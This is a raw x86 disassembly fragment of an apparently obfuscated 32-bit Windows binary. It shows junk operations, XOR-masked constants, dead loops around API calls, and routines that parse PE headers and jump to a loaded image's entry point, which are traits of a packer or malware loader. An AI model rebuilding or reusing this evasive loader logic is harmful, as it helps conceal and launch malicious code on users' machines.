  422c62:	inc    edx
  422c63:	mov    DWORD PTR ds:0x4285e7,edx
  422c69:	cmp    DWORD PTR ds:0x4285e7,0x9
  422c70:	jl     0x422cab
  422c76:	jmp    0x422c84
  422c7b:	push   DWORD PTR [ebp-0x18]
  422c7e:	call   DWORD PTR ds:0x4287bb
  422c84:	cmp    DWORD PTR ds:0x4285e7,0x8
  422c8b:	jne    0x422c9e
  422c91:	mov    edx,DWORD PTR ds:0x4285e7
  422c97:	inc    edx
  422c98:	mov    DWORD PTR ds:0x4285e7,edx
  422c9e:	cmp    DWORD PTR ds:0x4285e7,0x1b
  422ca5:	jb     0x422c5a
  422cab:	mov    eax,DWORD PTR [eax]
  422cad:	adc    edx,0x4266
  422cb3:	mov    edx,DWORD PTR [ebp-0x24]
  422cb6:	push   ebx
  422cb7:	push   esi
  422cb8:	push   edi
  422cb9:	xor    DWORD PTR ds:0x42865b,0x2427
  422cc3:	mov    edi,0x75108a4
  422cc8:	and    DWORD PTR ds:0x42867b,0x0
  422cd2:	xor    ebx,ebx
  422cd4:	or     ebx,DWORD PTR ds:0x42867b
  422cda:	inc    ebx
  422cdb:	mov    DWORD PTR ds:0x42867b,ebx
  422ce1:	cmp    DWORD PTR ds:0x42867b,0x18
  422ce8:	jg     0x422d20
  422cee:	jmp    0x422d13
  422cf3:	push   0x7b2e
  422cf8:	push   0x428028
  422cfd:	push   DWORD PTR [ebp-0x20]
  422d00:	push   0x42800b
  422d05:	push   0x82c9
  422d0a:	push   DWORD PTR [ebp-0x10]
  422d0d:	call   DWORD PTR ds:0x4287bf
  422d13:	cmp    DWORD PTR ds:0x42867b,0x10
  422d1a:	jb     0x422cd2
  422d20:	xor    eax,edi
  422d22:	mov    ebx,0x3272ec
  422d27:	sbb    DWORD PTR ds:0x4285ef,0x42860b
  422d31:	add    eax,ebx
  422d33:	mov    DWORD PTR [edx],eax
  422d35:	mov    eax,ds:0x4284f3
  422d3a:	cmp    eax,0x445cecf9
  422d3f:	jne    0x422e07
  422d45:	sbb    DWORD PTR ds:0x42860f,0x5794
  422d4f:	mov    eax,DWORD PTR [ebp-0x4]
  422d52:	mov    esi,DWORD PTR ds:0x42864b
  422d58:	or     esi,DWORD PTR ds:0x4285cf
  422d5e:	mov    DWORD PTR ds:0x42864b,esi
  422d64:	mov    edx,DWORD PTR ds:0x4282ef
  422d6a:	xor    DWORD PTR ds:0x42863f,0x1fa5
  422d74:	mov    edx,DWORD PTR [edx+0x198]
  422d7a:	xor    DWORD PTR ds:0x42864f,ecx
  422d80:	xor    eax,edi
  422d82:	add    eax,ebx
  422d84:	mov    DWORD PTR [edx],eax
  422d86:	sub    DWORD PTR ds:0x428617,edx
  422d8c:	mov    eax,DWORD PTR [ebp-0x4]
  422d8f:	mov    edx,DWORD PTR ds:0x428637
  422d95:	add    DWORD PTR ds:0x428663,edx
  422d9b:	xor    eax,edi
  422d9d:	and    DWORD PTR ds:0x42867b,0x0
  422da7:	xor    edx,edx
  422da9:	or     edx,DWORD PTR ds:0x42867b
  422daf:	inc    edx
  422db0:	mov    DWORD PTR ds:0x42867b,edx
  422db6:	cmp    DWORD PTR ds:0x42867b,0xb
  422dbd:	jg     0x422dfa
  422dc3:	jmp    0x422dd3
  422dc8:	push   0x4280a2
  422dcd:	call   DWORD PTR ds:0x4287c3
  422dd3:	cmp    DWORD PTR ds:0x42867b,0xa
  422dda:	jne    0x422ded
  422de0:	mov    edx,DWORD PTR ds:0x42867b
  422de6:	inc    edx
  422de7:	mov    DWORD PTR ds:0x42867b,edx
  422ded:	cmp    DWORD PTR ds:0x42867b,0x18
  422df4:	jb     0x422da7
  422dfa:	add    eax,ebx
  422dfc:	sub    DWORD PTR ds:0x428627,ecx
  422e02:	mov    ds:0x4284f3,eax
  422e07:	mov    edx,DWORD PTR ds:0x4285e7
  422e0d:	and    edx,DWORD PTR ds:0x428617
  422e13:	mov    DWORD PTR ds:0x4285e7,edx
  422e19:	mov    eax,ds:0x4282ef
  422e1e:	xor    edx,DWORD PTR ds:0x42865f
  422e24:	mov    eax,DWORD PTR [eax+0x18c]
  422e2a:	sbb    edx,0x43ef
  422e30:	mov    eax,DWORD PTR [eax]
  422e32:	adc    edx,esi
  422e34:	mov    DWORD PTR [ebp-0x34],eax
  422e37:	mov    eax,0xf89c85bc
  422e3c:	mov    DWORD PTR [ebp-0x24],eax
  422e3f:	and    DWORD PTR ds:0x42861f,0x0
  422e49:	mov    edx,DWORD PTR ds:0x42861f
  422e4f:	inc    edx
  422e50:	mov    DWORD PTR ds:0x42861f,edx
  422e56:	cmp    DWORD PTR ds:0x42861f,0x1e
  422e5d:	jle    0x422e97
  422e63:	jmp    0x422e8a
  422e68:	push   0x4285cf
  422e6d:	push   0x2375
  422e72:	push   0x5548
  422e77:	push   0x51cc
  422e7c:	push   0x80b2
  422e81:	push   DWORD PTR [ebp-0x28]
  422e84:	call   DWORD PTR ds:0x4287c7
  422e8a:	cmp    DWORD PTR ds:0x42861f,0x17
  422e91:	jb     0x422e49
  422e97:	mov    DWORD PTR [ebp-0x24],eax
  422e9a:	mov    DWORD PTR ds:0x42866b,0x46d0
  422ea4:	mov    DWORD PTR [ebp-0x24],eax
  422ea7:	xor    esi,esi
  422ea9:	or     esi,DWORD PTR ds:0x4285ef
  422eaf:	sub    DWORD PTR ds:0x428673,esi
  422eb5:	mov    DWORD PTR [ebp-0x24],ecx
  422eb8:	mov    DWORD PTR [ebp-0x38],eax
  422ebb:	and    esi,0x6095
  422ec1:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  422ec8:	sub    DWORD PTR ds:0x428653,edi
  422ece:	mov    esi,DWORD PTR [ebp-0x4]
  422ed1:	mov    ecx,DWORD PTR [ebp-0x8]
  422ed4:	mov    edx,DWORD PTR ds:0x4286a7
  422eda:	mov    edx,DWORD PTR [edx]
  422edc:	xor    DWORD PTR ds:0x4285cf,edx
  422ee2:	mov    edx,DWORD PTR [ebp-0x8]
  422ee5:	xor    edx,edi
  422ee7:	xor    ecx,edi
  422ee9:	add    DWORD PTR ds:0x42861f,0x42860f
  422ef3:	add    ecx,edx
  422ef5:	sbb    edx,0x585b
  422efb:	mov    edx,DWORD PTR [ebp-0x8]
  422efe:	xor    esi,edi
  422f00:	xor    edx,edi
  422f02:	adc    DWORD PTR ds:0x428647,0x7d1c
  422f0c:	add    esi,ebx
  422f0e:	mov    DWORD PTR ds:0x428607,0x675c
  422f18:	lea    ecx,[ecx+edx*1+0x9758c4]
  422f1f:	mov    DWORD PTR ds:0x428647,0x161d
  422f29:	cmp    esi,ecx
  422f2b:	mov    DWORD PTR ds:0x42861b,0x50e4
  422f35:	ja     0x423054
  422f3b:	xor    DWORD PTR ds:0x4285cf,0x42862b
  422f45:	mov    eax,DWORD PTR [ebp-0x8]
  422f48:	sbb    DWORD PTR ds:0x42866b,0x4285eb
  422f52:	xor    eax,edi
  422f54:	and    DWORD PTR ds:0x428633,0x42865b
  422f5e:	lea    eax,[eax+esi*1+0x3272ec]
  422f65:	push   eax
  422f66:	mov    eax,DWORD PTR [ebp-0x24]
  422f69:	xor    DWORD PTR ds:0x42863b,0x428647
  422f73:	xor    eax,edi
  422f75:	sbb    DWORD PTR ds:0x4285f7,0x428637
  422f7f:	lea    eax,[ebp+eax*1+0x3272f4]
  422f86:	push   eax
  422f87:	xor    eax,eax
  422f89:	add    eax,DWORD PTR ds:0x428653
  422f8f:	or     DWORD PTR ds:0x4285ef,eax
  422f95:	mov    eax,ds:0x4282ef
  422f9a:	push   DWORD PTR [eax+0x1bc]
  422fa0:	call   0x40aa5b
  422fa5:	and    DWORD PTR ds:0x428673,0x0
  422faf:	mov    eax,ds:0x428673
  422fb4:	inc    eax
  422fb5:	mov    ds:0x428673,eax
  422fba:	cmp    DWORD PTR ds:0x428673,0x2d
  422fc1:	jb     0x422fe9
  422fc7:	jmp    0x422fdc
  422fcc:	push   0x428657
  422fd1:	push   0x4280ae
  422fd6:	call   DWORD PTR ds:0x4287cb
  422fdc:	cmp    DWORD PTR ds:0x428673,0x1d
  422fe3:	jb     0x422faf
  422fe9:	mov    eax,DWORD PTR [ebp-0x8]
  422fec:	or     ecx,0x5d69
  422ff2:	xor    eax,edi
  422ff4:	lea    esi,[esi+eax*1+0x3272ec]
  422ffb:	not    ecx
  422ffd:	mov    eax,DWORD PTR [ebp-0x8]
  423000:	mov    DWORD PTR ds:0x42860b,0x501a
  42300a:	mov    ecx,DWORD PTR [ebp-0x8]
  42300d:	xor    ecx,edi
  42300f:	sbb    DWORD PTR ds:0x428667,0x42864b
  423019:	xor    eax,edi
  42301b:	sbb    DWORD PTR ds:0x4285ef,0xbec
  423025:	add    eax,ecx
  423027:	mov    ecx,DWORD PTR [ebp-0x8]
  42302a:	xor    ecx,edi
  42302c:	mov    DWORD PTR ds:0x4285e3,0x1b1e
  423036:	lea    eax,[eax+ecx*1+0x9758c4]
  42303d:	cmp    esi,eax
  42303f:	mov    DWORD PTR ds:0x42865b,0x1916
  423049:	jbe    0x422f3b
  42304f:	mov    eax,0xf89c85bc
  423054:	mov    ecx,DWORD PTR [ebp+0xc]
  423057:	mov    DWORD PTR ds:0x428173,ecx
  42305d:	or     DWORD PTR ds:0x4285ff,ebx
  423063:	mov    ecx,DWORD PTR [ebp+0x10]
  423066:	or     DWORD PTR ds:0x4285d7,ebx
  42306c:	mov    DWORD PTR ds:0x4283c7,ecx
  423072:	mov    DWORD PTR ds:0x42862b,0x16
  42307c:	cmp    DWORD PTR ds:0x42862b,0x0
  423083:	je     0x4230c8
  423089:	cmp    DWORD PTR ds:0x42862b,0x1e
  423090:	jg     0x4230c8
  423096:	jmp    0x4230b6
  42309b:	push   0x2088
  4230a0:	push   DWORD PTR [ebp-0x10]
  4230a3:	push   0x46c3
  4230a8:	push   0x5611
  4230ad:	push   DWORD PTR [ebp-0x20]
  4230b0:	call   DWORD PTR ds:0x42879f
  4230b6:	mov    edx,DWORD PTR ds:0x42862b
  4230bc:	dec    edx
  4230bd:	mov    DWORD PTR ds:0x42862b,edx
  4230c3:	jmp    0x42307c
  4230c8:	mov    ecx,DWORD PTR ds:0x428173
  4230ce:	mov    DWORD PTR ds:0x428673,0x6c19
  4230d8:	mov    edx,DWORD PTR [ebp-0x2c]
  4230db:	and    DWORD PTR ds:0x42864f,0x1852
  4230e5:	sub    ecx,ebx
  4230e7:	sbb    DWORD PTR ds:0x428663,0x32b3
  4230f1:	xor    ecx,edi
  4230f3:	mov    DWORD PTR ds:0x4285d7,0x3bce
  4230fd:	mov    DWORD PTR [edx],ecx
  4230ff:	mov    edx,DWORD PTR [ebp-0x20]
  423102:	mov    ecx,DWORD PTR ds:0x4285eb
  423108:	mov    ecx,0xf89c85b0
  42310d:	cmp    edx,ecx
  42310f:	mov    DWORD PTR ds:0x428637,0x7ca2
  423119:	jne    0x42322f
  42311f:	lea    eax,[ebp-0x10]
  423122:	mov    DWORD PTR [ebp-0x40],eax
  423125:	and    DWORD PTR ds:0x4285df,0x428623
  42312f:	lea    eax,[ebp+0x4]
  423132:	xor    DWORD PTR ds:0x428603,0x2610
  42313c:	mov    DWORD PTR [ebp-0x10],eax
  42313f:	mov    eax,DWORD PTR [ebp-0x10]
  423142:	test   eax,eax
  423144:	je     0x423423
  42314a:	movzx  eax,WORD PTR ds:0x42867b
  423151:	sub    DWORD PTR ds:0x42860b,eax
  423157:	mov    eax,DWORD PTR [ebp-0xc]
  42315a:	and    ecx,0x315b
  423160:	mov    eax,DWORD PTR [ebp-0x8]
  423163:	sbb    DWORD PTR ds:0x428633,edi
  423169:	mov    eax,DWORD PTR [ebp-0x4]
  42316c:	mov    ecx,DWORD PTR ds:0x42868f
  423172:	xor    esi,esi
  423174:	add    esi,DWORD PTR ds:0x42872b
  42317a:	sub    esi,ecx
  42317c:	imul   ecx,DWORD PTR [ecx+esi*1]
  423180:	mov    DWORD PTR [ebp+0xc],eax
  423183:	xor    ecx,esi
  423185:	mov    eax,eax
  423187:	mov    eax,ds:0x4282ef
  42318c:	mov    eax,DWORD PTR [eax+0x1c8]
  423192:	mov    eax,DWORD PTR [eax]
  423194:	cdq    
  423195:	mov    esi,0xfabdbedd
  42319a:	add    eax,esi
  42319c:	adc    edx,0xffffffff
  42319f:	and    DWORD PTR [ebp-0x38],0x0
  4231a3:	xor    edx,0x0
  4231a6:	mov    DWORD PTR [ebp-0x24],edx
  4231a9:	mov    edx,DWORD PTR [ebp+0xc]
  4231ac:	mov    DWORD PTR [ebp-0x3c],edx
  4231af:	mov    ecx,0x8a29a137
  4231b4:	xor    eax,ecx
  4231b6:	add    DWORD PTR [ebp-0x3c],esi
  4231b9:	mov    edx,DWORD PTR [ebp-0x3c]
  4231bc:	adc    DWORD PTR [ebp-0x38],0xffffffff
  4231c0:	xor    edx,ecx
  4231c2:	mov    DWORD PTR [ebp-0x30],edx
  4231c5:	mov    edx,DWORD PTR [ebp-0x38]
  4231c8:	xor    edx,0x0
  4231cb:	mov    DWORD PTR [ebp-0x2c],edx
  4231ce:	cmp    DWORD PTR [ebp-0x30],eax
  4231d1:	jne    0x4231e2
  4231d7:	mov    eax,DWORD PTR [ebp-0x24]
  4231da:	cmp    edx,eax
  4231dc:	je     0x42320f
  4231e2:	mov    eax,ds:0x4282ef
  4231e7:	mov    eax,DWORD PTR [eax+0x1c0]
  4231ed:	mov    eax,DWORD PTR [eax]
  4231ef:	xor    edx,edx
  4231f1:	add    eax,esi
  4231f3:	adc    edx,0xffffffff
  4231f6:	xor    eax,ecx
  4231f8:	xor    edx,0x0
  4231fb:	cmp    eax,0x70941fe9
  423200:	jne    0x423423
  423206:	cmp    edx,0xffffffff
  423209:	jne    0x423423
  42320f:	mov    eax,ds:0x42836b
  423214:	mov    edx,DWORD PTR ds:0x428373
  42321a:	xor    eax,edx
  42321c:	mov    ds:0x42836b,eax
  423221:	mov    edx,DWORD PTR ds:0x42836b
  423227:	mov    eax,DWORD PTR [ebp-0x10]
  42322a:	jmp    0x4233e3
  42322f:	mov    edx,DWORD PTR [ebp-0x14]
  423232:	cmp    edx,0xf89c85b1
  423238:	je     0x423295
  42323e:	mov    edx,DWORD PTR [ebp-0x4]
  423241:	mov    esi,DWORD PTR [ebp-0x18]
  423244:	xor    edx,edi
  423246:	add    edx,ebx
  423248:	cmp    edx,esi
  42324a:	je     0x423295
  423250:	mov    eax,ds:0x4282ef
  423255:	mov    eax,DWORD PTR [eax+0x194]
  42325b:	mov    ecx,DWORD PTR [eax]
  42325d:	mov    eax,DWORD PTR [ecx+0x3c]
  423260:	push   DWORD PTR ds:0x4283c7
  423266:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  42326a:	push   DWORD PTR ds:0x428173
  423270:	add    eax,ecx
  423272:	mov    ecx,DWORD PTR ds:0x4282ef
  423278:	mov    ecx,DWORD PTR [ecx+0x194]
  42327e:	push   DWORD PTR [ecx]
  423280:	call   eax
  423282:	mov    ecx,DWORD PTR ds:0x4282ef
  423288:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42328e:	mov    DWORD PTR [ecx],eax
  423290:	jmp    0x423423
  423295:	mov    edx,DWORD PTR [ebp-0x4]
  423298:	mov    esi,DWORD PTR [ebp-0x34]
  42329b:	xor    edx,edi
  42329d:	add    edx,ebx
  42329f:	cmp    edx,esi
  4232a1:	jne    0x4232fa
  4232a7:	mov    edx,DWORD PTR [ebp-0x4]
  4232aa:	mov    esi,DWORD PTR ds:0x4282ef
  4232b0:	mov    esi,DWORD PTR [esi+0x198]
  4232b6:	xor    edx,edi
  4232b8:	add    edx,ebx
  4232ba:	cmp    edx,DWORD PTR [esi]
  4232bc:	jne    0x4232d7
  4232c2:	push   ecx
  4232c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4232c6:	xor    ecx,edi
  4232c8:	add    ecx,ebx
  4232ca:	push   ecx
  4232cb:	push   eax
  4232cc:	push   DWORD PTR [ebp-0x8]
  4232cf:	push   DWORD PTR [ebp-0x4]
  4232d2:	call   0x42255e
  4232d7:	push   DWORD PTR [ebp-0x8]
  4232da:	push   DWORD PTR [ebp-0x4]
  4232dd:	call   0x401000
  4232e2:	mov    eax,DWORD PTR [ebp-0x4]
  4232e5:	xor    eax,edi
  4232e7:	add    eax,ebx
  4232e9:	mov    ds:0x428373,eax
  4232ee:	mov    eax,DWORD PTR [ebp-0x4]
  4232f1:	xor    eax,edi
  4232f3:	add    eax,ebx
  4232f5:	mov    ds:0x42836b,eax
  4232fa:	lea    eax,[ebp-0x1c]
  4232fd:	mov    DWORD PTR [ebp-0x44],eax
  423300:	lea    eax,[ebp+0x4]
  423303:	mov    DWORD PTR [ebp-0x1c],eax
  423306:	mov    eax,DWORD PTR [ebp-0x1c]
  423309:	test   eax,eax
  42330b:	je     0x423423
  423311:	mov    DWORD PTR [ebp-0x48],0xf152c39
  423318:	mov    DWORD PTR [ebp-0x4c],0x712ed2e
  42331f:	mov    DWORD PTR [ebp-0x50],0x373fc08
  423326:	mov    DWORD PTR [ebp-0x54],0x72670ad8
  42332d:	call   0x41d64a
  423332:	mov    eax,DWORD PTR [ebp-0xc]
  423335:	mov    eax,DWORD PTR [ebp-0x8]
  423338:	mov    eax,DWORD PTR [ebp-0x4]
  42333b:	mov    DWORD PTR [ebp+0xc],eax
  42333e:	mov    eax,eax
  423340:	mov    eax,ds:0x4282ef
  423345:	mov    eax,DWORD PTR [eax+0x1c8]
  42334b:	mov    eax,DWORD PTR [eax]
  42334d:	cdq    
  42334e:	mov    esi,0xfabdbedd
  423353:	add    eax,esi
  423355:	adc    edx,0xffffffff
  423358:	and    DWORD PTR [ebp-0x38],0x0
  42335c:	xor    edx,0x0
  42335f:	mov    DWORD PTR [ebp-0x24],edx
  423362:	mov    edx,DWORD PTR [ebp+0xc]
  423365:	mov    DWORD PTR [ebp-0x3c],edx
  423368:	mov    ecx,0x8a29a137
  42336d:	xor    eax,ecx
  42336f:	add    DWORD PTR [ebp-0x3c],esi
  423372:	mov    edx,DWORD PTR [ebp-0x3c]
  423375:	adc    DWORD PTR [ebp-0x38],0xffffffff
  423379:	xor    edx,ecx
  42337b:	mov    DWORD PTR [ebp-0x30],edx
  42337e:	mov    edx,DWORD PTR [ebp-0x38]
  423381:	xor    edx,0x0
  423384:	mov    DWORD PTR [ebp-0x2c],edx
  423387:	cmp    DWORD PTR [ebp-0x30],eax
  42338a:	jne    0x42339b
  423390:	mov    eax,DWORD PTR [ebp-0x24]
  423393:	cmp    edx,eax
  423395:	je     0x4233c8
  42339b:	mov    eax,ds:0x4282ef
  4233a0:	mov    eax,DWORD PTR [eax+0x1c0]
  4233a6:	mov    eax,DWORD PTR [eax]
  4233a8:	xor    edx,edx
  4233aa:	add    eax,esi
  4233ac:	adc    edx,0xffffffff
  4233af:	xor    eax,ecx
  4233b1:	xor    edx,0x0
  4233b4:	cmp    eax,0x70941fe9
  4233b9:	jne    0x423423
  4233bf:	cmp    edx,0xffffffff
  4233c2:	jne    0x423423
  4233c8:	mov    eax,ds:0x42836b
  4233cd:	mov    edx,DWORD PTR ds:0x428373
  4233d3:	xor    eax,edx
  4233d5:	mov    ds:0x42836b,eax
  4233da:	mov    edx,DWORD PTR ds:0x42836b
  4233e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4233e3:	add    DWORD PTR [eax],edx
  4233e5:	mov    edx,DWORD PTR [ebp+0xc]
  4233e8:	mov    eax,ds:0x42836b
  4233ed:	xor    edx,edi
  4233ef:	add    edx,ebx
  4233f1:	xor    ebx,ebx
  4233f3:	add    edx,esi
  4233f5:	adc    ebx,0xffffffff
  4233f8:	xor    edi,edi
  4233fa:	xor    edx,ecx
  4233fc:	xor    ebx,0x0
  4233ff:	add    eax,esi
  423401:	adc    edi,0xffffffff
  423404:	xor    eax,ecx
  423406:	xor    edi,0x0
  423409:	cmp    eax,edx
  42340b:	jne    0x423423
  423411:	cmp    edi,ebx
  423413:	jne    0x423423
  423419:	mov    eax,ds:0x42836b
  42341e:	mov    ds:0x428373,eax
  423423:	mov    eax,ds:0x4282ef
  423428:	push   0x4
  42342a:	add    eax,0x1cc
  42342f:	push   eax
  423430:	lea    eax,[ebp-0xc]
  423433:	push   eax
  423434:	call   0x40aa5b
  423439:	mov    eax,DWORD PTR [ebp-0xc]
  42343c:	mov    eax,DWORD PTR [eax]
  42343e:	pop    edi
  42343f:	pop    esi
  423440:	pop    ebx
  423441:	leave  
  423442:	ret    0xc
  423445:	xor    eax,eax
  423447:	add    DWORD PTR ds:0x4285f3,0x36c3
  423451:	inc    eax
  423452:	ret    
  423453:	push   ebp
  423454:	mov    ebp,esp
  423456:	push   ecx
  423457:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  42345e:	dec    edx
  42345f:	mov    eax,DWORD PTR [ebp+0x8]
  423462:	sbb    DWORD PTR ds:0x42864b,0x3b56
  42346c:	movsx  eax,BYTE PTR [eax]
  42346f:	xor    edx,edx
  423471:	xor    edx,DWORD PTR ds:0x428653
  423477:	or     edx,DWORD PTR ds:0x428637
  42347d:	mov    DWORD PTR ds:0x428653,edx
  423483:	mov    edx,0x3272ec
  423488:	mov    ecx,DWORD PTR ds:0x428607
  42348e:	adc    DWORD PTR ds:0x42865b,ecx
  423494:	sub    eax,edx
  423496:	movzx  ecx,WORD PTR ds:0x4285ff
  42349d:	sbb    DWORD PTR ds:0x42864f,ecx
  4234a3:	mov    ecx,0x75108a4
  4234a8:	or     DWORD PTR ds:0x4285d3,0x42864b
  4234b2:	xor    eax,ecx
  4234b4:	cmp    eax,0xf89c85c5
  4234b9:	mov    DWORD PTR ds:0x42864f,0x82b
  4234c3:	jne    0x423508
  4234c9:	adc    DWORD PTR ds:0x428633,ecx
  4234cf:	mov    eax,DWORD PTR [ebp+0x8]
  4234d2:	push   esi
  4234d3:	sub    DWORD PTR ds:0x4285e7,edi
  4234d9:	mov    esi,DWORD PTR [ebp+0x8]
  4234dc:	and    DWORD PTR ds:0x4285e3,0x244e
  4234e6:	add    esi,DWORD PTR [eax+0x3c]
  4234e9:	mov    DWORD PTR [ebp+0x8],esi
  4234ec:	mov    eax,DWORD PTR [ebp-0x4]
  4234ef:	mov    esi,DWORD PTR [ebp+0x8]
  4234f2:	xor    eax,ecx
  4234f4:	add    eax,edx
  4234f6:	cmp    DWORD PTR [esi+0x54],eax
  4234f9:	pop    esi
  4234fa:	je     0x423508
  423500:	mov    eax,DWORD PTR [ebp+0x8]
  423503:	jmp    0x42350f
  423508:	mov    eax,DWORD PTR [ebp-0x4]
  42350b:	xor    eax,ecx
  42350d:	add    eax,edx
  42350f:	leave  
  423510:	ret    0x4
  423513:	push   ebp
  423514:	mov    ebp,esp
  423516:	sub    esp,0xc
  423519:	push   esi
  42351a:	xor    DWORD PTR ds:0x428617,edi
  423520:	mov    esi,0xf89c85b0
  423525:	xor    edx,DWORD PTR ds:0x428657
  42352b:	mov    DWORD PTR [ebp-0x8],esi
  42352e:	sub    ecx,ecx
  423530:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  423537:	add    ecx,DWORD PTR ds:0x4285e3
  42353d:	push   edi
  42353e:	mov    eax,eax
  423540:	and    DWORD PTR ds:0x4285ff,0x0
  42354a:	xor    eax,eax
  42354c:	add    eax,DWORD PTR ds:0x4285ff
  423552:	inc    eax
  423553:	mov    ds:0x4285ff,eax
  423558:	cmp    DWORD PTR ds:0x4285ff,0x20
  42355f:	ja     0x423582
  423565:	jmp    0x423575
  42356a:	push   0x2fb5
  42356f:	call   DWORD PTR ds:0x4287a3
  423575:	cmp    DWORD PTR ds:0x4285ff,0x10
  42357c:	jb     0x42354a
  423582:	mov    eax,DWORD PTR [ebp-0x4]
  423585:	and    DWORD PTR ds:0x42862f,0x0
  42358f:	jmp    0x4235a1
  423594:	mov    ecx,DWORD PTR ds:0x42862f
  42359a:	inc    ecx
  42359b:	mov    DWORD PTR ds:0x42862f,ecx
  4235a1:	cmp    DWORD PTR ds:0x42862f,0x19
  4235a8:	jae    0x4235d3
  4235ae:	cmp    DWORD PTR ds:0x42862f,0x22
  4235b5:	ja     0x4235d3
  4235bb:	jmp    0x4235ce
  4235c0:	push   DWORD PTR [ebp-0x28]
  4235c3:	push   0x428028
  4235c8:	call   DWORD PTR ds:0x4287a7
  4235ce:	jmp    0x423594
  4235d3:	mov    edi,DWORD PTR [ebp-0x8]
  4235d6:	mov    ecx,0x75108a4
  4235db:	xor    eax,ecx
  4235dd:	sbb    edx,DWORD PTR ds:0x428637
  4235e3:	xor    edi,ecx
  4235e5:	mov    edx,0x3272ec
  4235ea:	add    edi,edx
  4235ec:	mov    DWORD PTR ds:0x42861b,0x1914
  4235f6:	add    eax,edx
  4235f8:	mov    DWORD PTR ds:0x42863b,0x6a3e
  423602:	imul   eax,edi
  423605:	mov    DWORD PTR ds:0x428613,ebx
  42360b:	mov    edi,DWORD PTR [ebp+0xc]
  42360e:	mov    DWORD PTR ds:0x428647,0x7cb7
  423618:	cmp    edi,eax
  42361a:	je     0x423671
  423620:	not    eax
  423622:	mov    DWORD PTR [ebp-0xc],esi
  423625:	mov    eax,DWORD PTR [ebp-0xc]
  423628:	mov    esi,DWORD PTR [ebp+0xc]
  42362b:	xor    eax,ecx
  42362d:	lea    eax,[eax*8+0x19397d8]
  423634:	mov    eax,DWORD PTR [esi+eax*1]
  423637:	mov    DWORD PTR [ebp+0xc],eax
  42363a:	mov    eax,DWORD PTR [ebp-0x4]
  42363d:	mov    esi,DWORD PTR [ebp-0x8]
  423640:	xor    eax,ecx
  423642:	xor    esi,ecx
  423644:	add    esi,edx
  423646:	add    eax,edx
  423648:	imul   eax,esi
  42364b:	mov    esi,DWORD PTR [ebp+0xc]
  42364e:	cmp    esi,eax
  423650:	je     0x423671
  423656:	mov    eax,DWORD PTR [ebp-0x4]
  423659:	xor    eax,ecx
  42365b:	mov    ecx,DWORD PTR [ebp+0xc]
  42365e:	add    eax,edx
  423660:	imul   eax,ecx
  423663:	add    eax,DWORD PTR [ebp+0x8]
  423666:	mov    DWORD PTR [ebp+0xc],eax
  423669:	mov    eax,DWORD PTR [ebp+0xc]
  42366c:	jmp    0x423682
  423671:	mov    eax,DWORD PTR [ebp-0x4]
  423674:	mov    esi,DWORD PTR [ebp-0x8]
  423677:	xor    esi,ecx
  423679:	xor    eax,ecx
  42367b:	add    esi,edx
  42367d:	add    eax,edx
  42367f:	imul   eax,esi
  423682:	pop    edi
  423683:	pop    esi
  423684:	leave  
  423685:	ret    0x8
  423688:	push   ebp
  423689:	mov    ebp,esp
  42368b:	sub    esp,0x38
  42368e:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  423695:	sub    DWORD PTR ds:0x428607,edi
  42369b:	push   ebx
  42369c:	adc    DWORD PTR ds:0x4285d3,0x5ead
  4236a6:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4236ad:	mov    eax,DWORD PTR [ebp-0x4]
  4236b0:	push   esi
  4236b1:	movzx  esi,WORD PTR ds:0x42865f
  4236b8:	or     esi,DWORD PTR ds:0x428643
  4236be:	mov    DWORD PTR ds:0x42865f,esi
  4236c4:	mov    esi,0x75108a4
  4236c9:	xor    eax,esi
  4236cb:	push   edi
  4236cc:	movzx  edi,WORD PTR ds:0x42862f
  4236d3:	add    edi,DWORD PTR ds:0x4285d3
  4236d9:	mov    DWORD PTR ds:0x42862f,edi
  4236df:	mov    edi,0x3272ec
  4236e4:	add    eax,edi
  4236e6:	and    DWORD PTR ds:0x42864f,0x1fff
  4236f0:	mov    DWORD PTR [ebp-0x1c],eax
  4236f3:	mov    eax,ds:0x4285d7
  4236f8:	sbb    DWORD PTR ds:0x42866b,eax
  4236fe:	mov    eax,DWORD PTR [ebp+0x14]
  423701:	test   eax,eax
  423703:	mov    DWORD PTR ds:0x42861b,0x61b5
  42370d:	je     0x42371d
  423713:	xor    eax,eax
  423715:	mov    eax,DWORD PTR [ebp+0x14]
  423718:	mov    eax,DWORD PTR [eax]
  42371a:	mov    DWORD PTR [ebp-0x1c],eax
  42371d:	and    DWORD PTR ds:0x42867b,ecx
  423723:	mov    eax,DWORD PTR [ebp-0x4]
  423726:	xor    eax,esi
  423728:	adc    DWORD PTR ds:0x4285eb,edx
  42372e:	add    eax,edi
  423730:	and    DWORD PTR ds:0x4285eb,ecx
  423736:	mov    DWORD PTR [ebp-0x8],eax
  423739:	xor    eax,eax
  42373b:	mov    eax,DWORD PTR [ebp-0xc]
  42373e:	sub    DWORD PTR ds:0x428607,0x2824
  423748:	xor    eax,esi
  42374a:	or     DWORD PTR ds:0x428663,0xb3a
  423754:	add    eax,edi
  423756:	sub    DWORD PTR ds:0x428617,edx
  42375c:	mov    DWORD PTR [ebp-0x24],eax
  42375f:	mov    ebx,DWORD PTR ds:0x428667
  423765:	and    DWORD PTR ds:0x428603,ebx
  42376b:	mov    eax,DWORD PTR [ebp-0x4]
  42376e:	xor    eax,esi
  423770:	add    eax,edi
  423772:	and    DWORD PTR ds:0x428637,0x0
  42377c:	mov    ebx,DWORD PTR ds:0x428637
  423782:	inc    ebx
  423783:	mov    DWORD PTR ds:0x428637,ebx
  423789:	cmp    DWORD PTR ds:0x428637,0x23
  423790:	ja     0x4237b9
  423796:	jmp    0x4237ac
  42379b:	push   0x428070
  4237a0:	push   DWORD PTR [ebp-0x14]
  4237a3:	push   DWORD PTR [ebp-0x14]
  4237a6:	call   DWORD PTR ds:0x4287ab
  4237ac:	cmp    DWORD PTR ds:0x428637,0x17
  4237b3:	jb     0x42377c
  4237b9:	mov    DWORD PTR [ebp-0x30],eax
  4237bc:	mov    ebx,DWORD PTR [ebp-0x4]
  4237bf:	xor    ebx,esi
  4237c1:	add    ebx,edi
  4237c3:	adc    eax,DWORD PTR ds:0x428673
